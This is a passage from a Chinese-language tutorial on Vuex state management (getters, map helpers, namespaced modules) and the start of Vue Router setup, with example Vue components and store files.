}}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    <button @click="increment">加{{ num }}</button>\n    <button @click="decrement">减{{ num }}</button>\n    <button @click="incrementOdd">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementWait">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { addWait, addOdd } from "../store/actions-types";\nimport { COUNT_ADD, COUNT_SUBTRACT } from "../store/mutation-types";\nexport default {\n  name: "Count",\n  data() {\n    // 把sum提取到state\n    return { num: 1 };\n  },\n  methods: {\n    increment() {\n      // 让mutations里的COUNT_ADD进行执行，并提供一个参数\n      this.$store.commit(COUNT_ADD, this.num);\n    },\n    decrement() {\n      // 让mutations里COUNT_SUBTRACT进行执行，并提供一个参数\n      this.$store.commit(COUNT_SUBTRACT, this.num);\n    },\n    incrementOdd() {\n      // 让actions里addOdd进行执行，并提供一个参数\n      this.$store.dispatch(addOdd, this.num);\n    },\n    incrementWait() {\n      // 让actions里addWait进行执行，并提供一个参数\n      this.$store.dispatch(addWait, this.num);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nactions里的方法的第一个形参context，有这些属性：commit、dispatch、getters、rootGetters、rootState、state。它如此设计目的是，能在actions的方法里面进行非常复杂的操作，例如组合使用actions里的方法，再例如连续使用Promise，再例如根据state数据的值来确定是进行异步还是继续commit等。\n\nmutations里的方法的第一个形参state，最好只做一些简单判断和修改值，它给你只提供了state，所以也没法进行非常复杂的业务判断（当然也别想着进行异步操作）。使用Vue DevTools可以查看mutations和state，却看不了actions。\n\n\n# 2.4 getters\n\n多个组件在使用state数据时，可能需要进行一些处理，比如过滤操作，那么在组件各自的computed去做计算属性，让计算属性去依赖state数据。大部分确实是这么做的也应该这么做，如果多个组件的处理逻辑一样呢？那代码是不是重复了？\n\n其实可以使用Vuex的getters（与state平级），它将多个组件里共用的计算属性提取到getters的属性上，这些属性实际上是依赖于某个state数据。只要state数据变化了，对应依赖它的getters就会随之变化。\n\n你可以看到那store里的getters，和组件里的计算属性非常的像，它们的区别是，store里的getters只有getter而没有setter，而组件的计算属性即拥有getter也拥有setter。\n\n// 某个组件的计算属性，依赖于一个state数据，做一个过滤的操作\ncomputed: {\n  doneTodosCount () {\n    return this.$store.state.todos.filter(todo => todo.done).length\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n如果多个组件都使用过滤的逻辑，就可以提取到store的getters里形成复用：\n\n// 在store里添加getters配置项，用于存储公共的“计算属性”\nconst store = new Vuex.Store({\n  state: {\n    todos: [\n      { id: 1, text: \'...\', done: true },\n      { id: 2, text: \'...\', done: false }\n    ]\n  },\n  getters: {\n    // 相当于store的计算属性的getter方法，并且它还是公共的，能被很多组件访问\n    doneTodos: state => {\n      return state.todos.filter(todo => todo.done)\n    }\n  }\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n虽然getters的属性是只有getter没有setter，但是他有一个非常重要的扩展功能，那就是可以接收参数，按照参数来进行逻辑处理。比如按照参数来过滤列表。虽然getters是多处复用的，代码都一样，但我还是想传点参数可以进行业务判断。\n\n// store里的getters，如果接收另外的参数，相当于返回一个函数\ngetters: {\n  // getTodoById在被子组件使用时，可接收一个参数，用于对公共数据todos进行特定值的寻找\n  getTodoById: (state) => (id) => {\n    return state.todos.find(todo => todo.id === id)\n  }\n}\n\n// 子组件使用处，既然你返回的是一个函数，那我就可以对它进行传参，进行特定的处理逻辑\nstore.getters.getTodoById(2) // -> { id: 2, text: \'...\', done: false }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 2.5 辅助函数——快速生成属性和方法\n\n前面一节里，我们通常将state数据使用组件的计算属性来接收，这样反常方便的在模板中使用（减少了$store.state.这两层访问）。\n\n一旦组件里使用的state数据过多，那每次都要在computed手动生成对应的计算属性，非常的不方便。我们可以使用mapState辅助函数，帮助我们快速的自动的生成对应的计算数据。当然，既然state数据可以使用mapState进行快速生成，getters也可以使用对应的mapGetters进行快速生成。\n\nmapState和mapGetters的入参可以是对象也可以是数组。如果是对象，那表示state数据名和本组件计算属性名不一样；如果是数组，那表示state数据名和本组件计算属性名一致。\n\nmapState和mapGetters的返回值是一个对象，该对象里的所有属性名就是刚刚说的传参数据，我们需要将这个返回对象打散并放入本组件的computed里，具体是使用...展开符。\n\n我们先准备一个store(store/index.js)：\n\nimport Vue from \'vue\';\nimport Vuex from \'vuex\';\nimport { COUNT_ADD } from "./mutation-types";\n\nVue.use(Vuex)\n\nexport default new Vuex.Store({\n    state: { sum: 0, name: \'张三\', age: 18 },\n    getters: {\n        smallSum: state => state.sum - 10,\n        middleSum: state => state.sum + 10,\n        bigSum: state => state.sum * 10,\n    },\n    actions: {},\n    mutations: {\n        [COUNT_ADD](state, value) {\n            state.sum += value;\n        },\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n未经过mapState和mapGetters优化的Count.vue：\n\n<template>\n  <div>\n    <h2>{{ msg }}，{{ na }}，你的年龄是{{ ag }}吗？</h2>\n    <h2>当前的和值为：{{ he }}</h2>\n    <h2>当前和值减少后为：{{ smlSum }}</h2>\n    <h2>当前和值增大后为：{{ midSum }}</h2>\n    <h2>当前和值翻倍后为：{{ biSum }}</h2>\n    <button @click="increment">加1</button>\n  </div>\n</template>\n\n<script>\nimport { COUNT_ADD } from "../store/mutation-types";\nexport default {\n  name: "Count",\n  data() {\n    return { msg: "你好呀" };\n  },\n  computed: {\n    // 拿取store里的state数据，作为本组件的计算属性。并且还不能使用箭头函数进行简写\n    he() { return this.$store.state.sum },\n    na() { return this.$store.state.name },\n    ag() { return this.$store.state.age },\n    // 拿取store里的getters属性，作为本组件的计算属性\n    smlSum() { return this.$store.getters.smallSum },\n    midSum() { return this.$store.getters.middleSum },\n    biSum() { return this.$store.getters.bigSum },\n  },\n  methods: {\n    increment() { this.$store.commit(COUNT_ADD, 1) },\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n经过mapState和mapGetters优化过的Count.vue：\n\n<template>\n  <div>\n    <h2>{{ msg }}，{{ na }}，你的年龄是{{ ag }}吗？</h2>\n    <h2>当前的和值为：{{ he }}</h2>\n    <h2>当前和值减少后为：{{ smlSum }}</h2>\n    <h2>当前和值增大后为：{{ midSum }}</h2>\n    <h2>当前和值翻倍后为：{{ biSum }}</h2>\n    <button @click="increment">加1</button>\n  </div>\n</template>\n\n<script>\nimport { mapState, mapGetters } from "vuex";\nimport { COUNT_ADD } from "../store/mutation-types";\nexport default {\n  name: "Count",\n  data() {\n    return { msg: "你好呀" };\n  },\n  computed: {\n    // mapState和mapGetters的入参是个对象，如果state数据与组件计算属性不同名，就使用对象形式；如果同名就使用数组形式。\n    // mapState和mapGetters的返回值是一个对象，必须使用`...`展开符将该对象属性合并到本组件的计算属性里\n    ...mapState({ \n      he: "sum",            // 将`he`映射为`this.$store.state.sum`\n      na: "name",           // 将`na`映射为`this.$store.state.name`\n      ag: "age"             // 将`ag`映射为`this.$store.state.age`\n      }),\n    ...mapGetters({\n      smlSum: "smallSum",   // 将`smlSum`映射为`this.$store.getters.smallSum`\n      midSum: "middleSum",  // 将`midSum`映射为`this.$store.getters.middleSum`\n      biSum: "bigSum"       // 将`biSum`映射为`this.$store.getters.bigSum`\n      }),\n    // ...mapState(["sum", "name", "age" ]), // 两边同名，可避免取名的烦恼。同名要以state里的变量名为主导\n    // ...mapGetters(["smallSum", "middleSum", "bigSum" ]), // 两边同名，可避免取名的烦恼\n  },\n  methods: {\n    increment() {\n      this.$store.commit(COUNT_ADD, 1);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\nmapActions和mapMutations其实和上面的mapState和mapGetters类似。mapActions用于快速在本组件里生成与actions里对应的方法调用，mapMutations用于快速在本组件里生成与mutations里对应的方法调用。\n\n它们生成的东西都放在methods里。如果你要使用它们生成的方法，在传参的时候非常值得注意，如果是在模板中使用那就必须得手动带上参数。\n\n我们把2.3 Vuex的基本使用的例子经过mapActions和mapMutations的优化，代码如下：\n\n<template>\n  <div>\n    \x3c!-- 使用共享数据sum --\x3e\n    <h2>当前和为：{{ $store.state.sum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    \x3c!-- 因为使用mapMutations和mapActions，在模板中必须手动传参 --\x3e\n    <button @click="increment(num)">加{{ num }}</button>\n    <button @click="decrement(num)">减{{ num }}</button>\n    <button @click="incrementOdd(num)">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementWait(num)">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { mapActions, mapMutations } from "vuex";\nimport { addWait, addOdd } from "../store/actions-types";\nimport { COUNT_ADD, COUNT_SUBTRACT } from "../store/mutation-types";\nexport default {\n  name: "Count",\n  data() {\n    return { num: 1 };\n  },\n  methods: {\n    ...mapMutations({\n      // 将`increment`映射为`this.$store.commit(COUNT_ADD)`，注意没有带上参数，必须在模板中手动添加入参\n      increment: COUNT_ADD,\n      // 将`increment`映射为`this.$store.commit(COUNT_ADD)`，注意没有带上参数，必须在模板中手动添加入参\n      decrement: COUNT_SUBTRACT,\n    }),\n    ...mapActions({\n      // 将`incrementOdd`映射为`this.$store.dispatch(addOdd)`，注意没有带上参数，必须在模板中手动添加入参\n      incrementOdd: addOdd,\n      // 将`incrementWait`映射为`this.$store.dispatch(addWait)`，注意没有带上参数，必须在模板中手动添加入参\n      incrementWait: addWait,\n    }),\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 2.6 Vuex模块化\n\n我们不可能将所有业务的共享数据以及方法都放在一个store文件里，这会特别臃肿特别混乱导致难以维护，我们可以按照业务模块或功能对store进行拆分，将他们拆分成一个个模块，每个模块拥有自己的state、mutations、actions、getters（模块内还能嵌套）。\n\n// 拆分成一个模块A\nconst moduleA = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... },\n  getters: { ... }\n}\n// 拆分成一个模块B\nconst moduleB = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... }\n}\nconst store = new Vuex.Store({\n  // 使用modules配置项将上面的模块放到Store中去\n  modules: {\n    a: moduleA,\n    b: moduleB\n  }\n})\nstore.state.a // -> moduleA 的状态，注意，不是store.a.state\nstore.state.b // -> moduleB 的状态，注意，不是store.a.state\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n每个模块内的mutations、actions、getters里的方法，它们的形参都是在本模块中是局部的。如果想在方法中访问全局的state和getters，1) getters里的方法的第三和第四形参是rootState和rootGetters；2) actions里的方法的形参context中有rootState和rootGetters。\n\nconst moduleA = {\n  getters: {\n    // state和getters这两个形参是局部的，rootState和rootGetters可以访问到根节点的state和getters\n    sumWithRootCount (state, getters, rootState, rootGetters) {\n      return state.count + rootState.count\n    }\n  },\n  actions: {\n    // context中有rootState和`rootGetters，可以访问到根节点的state和getters\n    incrementIfOddOnRootSum ({ state, commit, rootState }) {\n      if ((state.count + rootState.count) % 2 === 1) {\n        commit(\'increment\')\n      }\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n上说的是模块里的方法的形参是在模块内部是局部的。而模块里的state、actions、mutations和getters本身，在默认情况下是注册在全局命名空间的，这使得多个模块能够对同一state、actions、mutations和getters作出响应。\n\n如果想让模块在使用state、actions、mutations和getter时要通过“模块名”来访问，那就可以给模块打开namespaced开关，那么modules的属性名就会作为模块的命名空间了。\n\n下面这个例子，使用了模块化和命名空间，我们要熟悉store在组件内部是怎么使用的。使用mapState、mapGetters、mapActions、mapMutations写法是最简单的，只需要在形参列表里的第一个位置上加上模块名这个新参数即可；而原始写法就得特别注意了，state是数据，一般this.$store.state.模块名.属性即可，而getters、actions、mutations里是方法，关键部位必须是"模块名/方法名"的形式。\n\nstore/index.js：\n\nimport Vue from \'vue\';\nimport Vuex from \'vuex\';\nimport countAbout from \'./countAbout\'\nimport personAbout from \'./personAbout\'\n\nVue.use(Vuex)\n\nexport default new Vuex.Store({\n    // 使用modules将countStore和personStore放入Store\n    modules: {\n        countAbout,\n        personAbout\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nstore/personAbout.js：\n\nimport { changeAge } from \'./actions-types\';\nimport { PERSON_CHANGE_AGE, PERSON_CHANGE_ADDRESS } from "./mutation-types";\nexport default {\n    // 开启命名空间\n    namespaced: true,\n    state: { name: "张三", age: 18, address: \'武汉\' },\n    actions: {\n        [changeAge](context, value) {\n            setTimeout(() => {\n                context.commit(PERSON_CHANGE_AGE, context.state.age + value);\n            }, 1000);\n        }\n    },\n    mutations: {\n        [PERSON_CHANGE_AGE](state, value) {\n            state.age = value;\n        },\n        [PERSON_CHANGE_ADDRESS](state, value) {\n            state.address = value;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nstore/countAbout.js：\n\nimport { addWait, addOdd } from \'./actions-types\';\nimport { COUNT_ADD, COUNT_SUBTRACT } from "./mutation-types";\nexport default {\n    // 开启命名空间\n    namespaced: true,\n    state: { sum: 0 },\n    getters: { bigSum: state => state.sum * 10 },\n    actions: {\n        [addWait](context, value) {\n            setTimeout(() => {\n                context.commit(COUNT_ADD, value);\n            }, 1000)\n        },\n        [addOdd]({ state, commit }, value) {\n            if (state.sum % 2) commit(COUNT_ADD, value);\n        }\n    },\n    mutations: {\n        [COUNT_ADD](state, value) {\n            state.sum += value;\n        },\n        [COUNT_SUBTRACT](state, value) {\n            state.sum -= value;\n        },\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nPerson.vue：\n\n<template>\n  <div>\n    <h2>Count组件里的当前和值是：{{ sum }}，放大十倍后：{{ bigSum }}</h2>\n    <h2>下面是Person组件本身的内容：</h2>\n    <h2>姓名：{{ name }}</h2>\n    <h2>年龄：{{ age }}</h2>\n    <h2>住址：{{ address }}</h2>\n    <span>选择几年后：</span>\n    <select v-model.number="years" @change="changeAge">\n      <option value="5">5</option>\n      <option value="8">8</option>\n      <option value="12">12</option>\n    </select>\n    <span>搬家：</span>\n    <select v-model="addre" @change="changeAddress">\n      <option value="武汉">武汉</option>\n      <option value="上海">上海</option>\n      <option value="北京">北京</option>\n    </select>\n  </div>\n</template>\n\n<script>\nimport { changeAge } from "../store/actions-types";\nimport { PERSON_CHANGE_ADDRESS } from "../store/mutation-types";\nexport default {\n  name: "Person",\n  data() {\n    return {\n      years: "",\n      addre: "武汉",\n    };\n  },\n  computed: {\n    name() {\n      // 开启命名空间后，读取state时的原始写法：this.$store.state.模块名.属性名\n      return this.$store.state.personAbout.name;\n    },\n    age() {\n      return this.$store.state.personAbout.age;\n    },\n    address() {\n      return this.$store.state.personAbout.address;\n    },\n    sum() {\n      return this.$store.state.countAbout.sum;\n    },\n    bigSum() {\n      // 开启命名空间后，读取getters时的原始写法：this.$store.getters["模块名/属性名"]\n      return this.$store.getters["countAbout/bigSum"];\n    },\n  },\n  methods: {\n    changeAge() {\n      // 开启命名空间后，使用dispatch时的原始写法：this.$store.dispatch("模块名/方法名", xxx)，xxx是方法的入参\n      this.$store.dispatch(`personAbout/${changeAge}`, this.years);\n    },\n    changeAddress() {\n      // 开启命名空间后，使用commit时的原始写法：this.$store.commit("模块名/方法名", xxx)，xxx是方法的入参\n      this.$store.commit(`personAbout/${PERSON_CHANGE_ADDRESS}`, this.addre);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nCount.vue：\n\n<template>\n  <div>\n    <h2>\n      Person组件里的姓名是：{{ name }}，年龄是：{{ age }}，住址是：{{ address }}\n    </h2>\n    <h2>下面是Count组件本身的内容：</h2>\n    <h2>当前和为：{{ sum }}</h2>\n    <h2>当前和放大十倍后：{{ bigSum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    \x3c!-- 因为使用mapMutations和mapActions，在模板中必须手动传参 --\x3e\n    <button @click="increment(num)">加{{ num }}</button>\n    <button @click="decrement(num)">减{{ num }}</button>\n    <button @click="incrementOdd(num)">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementWait(num)">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { mapActions, mapMutations, mapState, mapGetters } from "vuex";\nimport { addWait, addOdd } from "../store/actions-types";\nimport { COUNT_ADD, COUNT_SUBTRACT } from "../store/mutation-types";\nexport default {\n  name: "Count",\n  data() {\n    return { num: 1 };\n  },\n  computed: {\n    // 开启命名空间后，读取state时的mapState写法：...mapState("模块名", ["属性名"])\n    ...mapState("countAbout", ["sum"]),\n    ...mapState("personAbout", ["name", "age", "address"]),\n    // 开启命名空间后，读取getters时的mapGetters写法：...mapGetters("模块名", ["属性名"])\n    ...mapGetters("countAbout", ["bigSum"]),\n  },\n  methods: {\n    // 开启命名空间后，使用dispatch时的mapActions写法：...mapActions("模块名", ["方法名"])\n    //  或者 ...mapActions("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapActions("countAbout", {\n      incrementOdd: addOdd,\n      incrementWait: addWait,\n    }),\n    // 开启命名空间后，使用commit时的mapMutations写法：...mapMutations("模块名", ["方法名"])\n    //  或者 ...mapMutations("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapMutations("countAbout", {\n      increment: COUNT_ADD,\n      decrement: COUNT_SUBTRACT,\n    }),\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. Vuex的模块化+命名空间：让代码更好维护，让多种数据分类更加明确。\n\n 2. 修改store.js（store/index.js）：\n    \n    const countAbout = {\n        // 开启命名空间\n        namespaced: true,\n        state: { ... },\n        actions: { ... },\n        mutations: { ... },\n    }\n    const personAbout = {\n        // 开启命名空间\n        namespaced: true,\n        state: { ... },\n        actions: { ... },\n        mutations: { ... },\n    }\n    const store = new Vuex.Store({\n      modules: {\n        countAbout,\n        personAbout\n      }\n    })\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 3. 开启命名空间后，组件中读取state数据：\n    \n    // 方式一：原始写法，this.$store.state.模块名.属性名\n    this.$store.state.personAbout.name;\n    // 方式二：借助mapState的写法，...mapState("模块名", ["属性名"])\n    ...mapState("countAbout", ["sum"]),\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 开启命名空间后，组件中读取getters数据：\n    \n    // 方式一：原始写法，this.$store.getters["模块名/方法名"]\n    this.$store.getters["personAbout/bigSum"]; // bigSum是属性的形式，实际上是个方法\n    // 方式二：借助mapGetters的写法，...mapGetters("模块名", ["方法名"])\n    ...mapState("countAbout", ["bigSum"]),\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 开启命名空间后，组件中调用dispatch：\n    \n    // 方式一：原始写法，this.$store.dispatch("模块名/方法名", xxx)，xxx是方法的入参\n    this.$store.dispatch(`personAbout/${changeAge}`, this.years); // years是入参\n    // 方式二：借助mapActions的写法，...mapActions("模块名", ["方法名"])\n    //  或者 ...mapActions("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapActions("countAbout", {\n      incrementOdd: addOdd,  // 这里没有入参，需要在模板使用处手动添加入参\n      incrementWait: addWait,\n    }),\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 6. 开启命名空间后，组件中调用commit：\n    \n    // 方式一：原始写法，this.$store.commit("模块名/方法名", xxx)，xxx是方法的入参\n    this.$store.commit(`personAbout/${PERSON_CHANGE_ADDRESS}`, this.addre); // addre是入参\n    // 方式二：借助mapMutations的写法，...mapMutations("模块名", ["方法名"])\n    //  或者 ...mapMutations("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapMutations("countAbout", {\n      increment: COUNT_ADD,  // 这里没有入参，需要在模板使用处手动添加入参\n      decrement: COUNT_SUBTRACT,\n    }),\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n----------------------------------------\n\n\n# 三、Vue Router\n\n路由：从起点到终点这样一个端到端的形式（关系），类似于映射或者key-value。\n\n路由器：管理着多个路由，决定着路由具体是哪个端口到哪个端口，以及如何解析端口等。\n\n单页面应用：也叫SPA，它表示应用始终只使用一个html页面进行展示以及与用户的交互，不会重新加载页面也不会跳转到新页面，如果页面需要新数据可以通过ajax技术从服务端获取。即使用户点击了应用中属于应用本身的链接，也只是浏览器里URL路径变化了，而页面只是局部进行了重新渲染。SPA的好处就是用户无需频繁切换浏览器页签，方便前端开发人员管理页面以及复杂组件的更新。坏处就是代码等资源比较集中那么初始化加载慢，因为内容都随用随取所以SEO较差。\n\nweb路由器：前端项目中的路由器，用于决定什么URL（端）展示什么模块（组件）。服务器端里的路由器，接收客户端的请求，根据它的请求使用对应的方法（接口）来处理这一次请求。\n\n\n# 3.1 搭建Vue Router环境\n\nVue Router是Vue官方提供的路由管理器，和Vuex一样也是一个插件。它会配置路由信息，决定URL地址展示什么页面，可实现不重新加载整个页面就能局部更新渲染组件（改变内容无需刷新页面）。\n\n先使用npm i vue-router在项目中局部安装Vue Router，然后在项目根目录下新建router目录，并在该目录下新建index.js文件。用于存放router路由器的相关代码，也是用于集中管理路由。\n\n导入Vue和Vue Router，使用使用Vue.use(Router)将Vue Router功能增加到Vue上。然后对Router进行实例化，传入一个配置对象，该配置对象有一个routers配置，是用来定义路由规则，也就是决定哪个url会对应到哪个组件（端到端的关系）。\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\n\n// 这个同Vuex，在实例化之前就将Router的功能增加到Vue上\nVue.use(Router);\n\n// 对Router进行实例化，并设置路由规则，URL对应着组件\nexport default new Router({\n    // 是routes不是routers\n    routes: [{\n      path: \'/xxx\',   // 地址\n      component: Xxx, // 组件\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n将导出的Router实例放在Vue配置对象的名为router属性上，是为了让每个组件都能使用router。main.js代码如下：\n\nimport Vue from \'vue\'\nimport App from \'./App.vue\'\nimport router from \'./router/index\'\n\nnew Vue({\n  el: \'#app\',\n  render: h => h(App),\n  // 在这里放入Router实例，那么每个组件里都能使用`this.$router`访问了\n  router,\n  components: { App },\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 3.2 Router的基本使用\n\n我们先在项目的public目录下准备两个html，用于展示多页面项目。将下面两个html放入public目录后，打开http://localhost:8080/home.html，会看到Home和About切换按钮以及它们的展示区域，点击它们就可以看到浏览器URL变了并且页面重新加载了。\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <title>Vue App</title>\n  <style>\n  a { text-decoration: none; }\n  .link { float: left; width: 6%; margin-left: 10%; }\n  .content { float: left; width: 50%; height: 86px;\n    margin-left: 2%; background-color: gray; }\n  .list-item { position: relative; display: block; padding: 10px 15px;\n    background-color: #fff; border: 1px solid #ddd; }\n  .list-item.active { z-index: 2; color: #fff;\n    background-color: #337ab7; border-color: #337ab7; }\n  </style>\n</head>\n<body>\n  <div>\n    <div class="link">\n        <a class="list-item active" href="./home.html">Home</a>\n        <a class="list-item" href="./about.html">About</a>\n    </div>\n    <div class="content">\n          <p>我是Home的内容，我是Home的内容，我是Home的内容，我是Home的内容</p>\n    </div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <title>Vue App</title>\n  <style>\n  a { text-decoration: none; }\n  .link { float: left; width: 6%; margin-left: 10%; }\n  .content { float: left; width: 50%; height: 86px;\n    margin-left: 2%; background-color: gray; }\n  .list-item { position: relative; display: block; padding: 10px 15px;\n    background-color: #fff; border: 1px solid #ddd; }\n  .list-item.active { z-index: 2; color: #fff;\n    background-color: #337ab7; border-color: #337ab7; }\n  </style>\n</head>\n<body>\n  <div>\n    <div class="link">\n        <a class="list-item" href="./home.html">Home</a>\n        <a class="list-item active" href="./about.html">About</a>\n    </div>\n    <div class="content">\n          <p>我是About的内容，我是About的内容，我是About的内容，我是About的内容</p>\n    </div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n我们要使用Vue + Vue Router实现同样的功能。在项目的src里新建pages目录，在该目录下新建Home.ve和About.vue。然后将主要代码放入App.vue里，重点来了，把Home\\About这两个<a>标签换成router-link来替代点击修改URL的功能，再将展示区的<p>标签换成<router-view>>来替代展示功能，当URL变化时不会重新加载页面，只会让展示区重新渲染。最后打开http://localhost:8080/home进行验证。代码如下：\n\nrouter/index.js：\n\nimport Vue from \'vue\'\nimport Router from \'vue-router\'\nimport Home from \'../pages/Home\'\nimport About from \'../pages/About\'\n\nVue.use(Router);\n\nexport default new Router({\n    // 将Home和About加到路由里，并设置让它们展示的URL地址\n    routes: [{\n        path: \'/home\',      // URL地址 端\n        component: Home     // 展示组件 端\n    }, {\n        path: \'/about\',\n        component: About\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nApp.vue：\n\n<template>\n  <div class="outer">\n    <div class="link">\n      \x3c!-- <a class="list-item" href="./home.html">Home</a>\n        <a class="list-item active" href="./about.html">About</a> --\x3e\n      \x3c!-- 使用router-link来替代之前的a标签，to对应着href，active-class对应着active --\x3e\n      <router-link to="/home" active-class class="list-item">Home</router-link>\n      <router-link to="/about" class="list-item">About</router-link>\n    </div>\n    <div class="content">\n      \x3c!-- <p>我是About的内容，我是About的内容，我是About的内容，我是About的内容</p> --\x3e\n      \x3c!-- 使用router-view来替代之前的p，其实就是组件展示（端到端，这是展示端） --\x3e\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "App",\n};\n<\/script>\n<style>\n.outer { display: flex; }\n.link { \n  display: flex; flex-direction: column;\n  margin-left: 16%;\n}\n.content {\n  margin-left: 10px; padding: 20px;\n  background-color: darkgrey;\n}\n.list-item {\n  margin-bottom: 10px; padding: 10px 15px;\n  background-color: #fff; border: 1px solid #ddd;\n}\n.list-item.active,\n.list-item.router-link-exact-active {\n  z-index: 2; color: #fff;\n  background-color: #337ab7;\n  border-color: #337ab7;\n}\na { text-decoration: none; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\npages/Home.vue：\n\n<template>\n  <p>\n    Vue组件Home：我是Home的内容，我是Home的内容，我是Home的内容，我是Home的内容\n  </p>\n</template>\n\n<script>\nexport default {\n  name: "Home",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npages/About.vue：\n\n<template>\n  <p>\n    